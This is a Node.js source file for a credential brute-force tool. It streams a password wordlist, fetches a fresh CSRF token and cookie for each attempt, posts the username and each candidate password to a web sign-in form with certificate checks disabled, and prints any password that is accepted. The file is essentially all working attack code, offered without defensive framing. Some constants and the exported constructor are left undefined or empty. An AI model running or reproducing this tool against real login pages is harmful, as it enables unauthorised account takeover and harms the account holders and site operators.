// Module Dependencies
var fs      = require('fs');
var stream  = require('stream');
var es      = require('event-stream');
var async   = require('async');
var request = require('request');

function Attack(config) {
  
}

function launch(config) {
  var queue = async.queue(tryLogin, config.numRequests);

  queue.drain = function() {
    console.log('[+] Finished');
  };

  console.log('[+] Reading wordlist...')

  fs.createReadStream(config.wordlist)
    .on('error', function() {
      console.log('[-] Error reading file');
    })
    .on('end', function() {
      console.log('[+] Full wordlist read');
    })
    .pipe(es.split())
    .pipe(es.map(function(word) {
        queue.push(word);
      })
    );
}

module.exports = Attack;

// ================================================================================================
// ================================================================================================


// Configure the CSRF token request
var csrfOptions = {
  url: BASE_URL,
  method: 'GET',
  headers: {},
  rejectUnauthorized: false
};

// Define function to extract CSRF token
function getCSRF(callback) {
  request(csrfOptions, function (error, response, body) {

    if (!error && response.statusCode == 200) {
      var cookieString = response.headers['set-cookie'][0];
      var csrfToken    = body.match(CSRF)[1];

      callback(csrfToken, cookieString);
    }
  });
}

// Configure the login request
function loginOptions(password, csrfToken, cookieString) {
  return {
    url: BASE_URL,
    method: 'POST',
    headers: { 
      Cookie: cookieString 
    },
    form: {
      'authenticity_token': csrfToken,
      'user[email]': USERNAME,
      'user[password]': password,
      'commit': 'Sign+in'
    },
    rejectUnauthorized: false
  };
}

// Process login response
function processLoginResponse(response, body, password) {

  // If we match known regex password is incorrect
  if (response.statusCode === 200 && body.match(ERROR)) {
    
    console.log('[-] Invalid: ' + password);

  } else if (response.statusCode < 400) {

    console.log('[+] FOUND: ' + password  + '\n[+] Shutting down....');
    process.exit();
  
  } else {
    
    console.log('[-] Server responded with: ' + response.statusCode);
  
  }
}

// Login attempt
function tryLogin(password, callback) {

  getCSRF(function(token, cookieString) {
    var opt = loginOptions(password, token, cookieString);
    
    // Send a login POST
    request(opt, function (error, response, body) {

      if (!error) { 
        processLoginResponse(response, body, password);
      }
      
      callback && callback();
    });
  });
}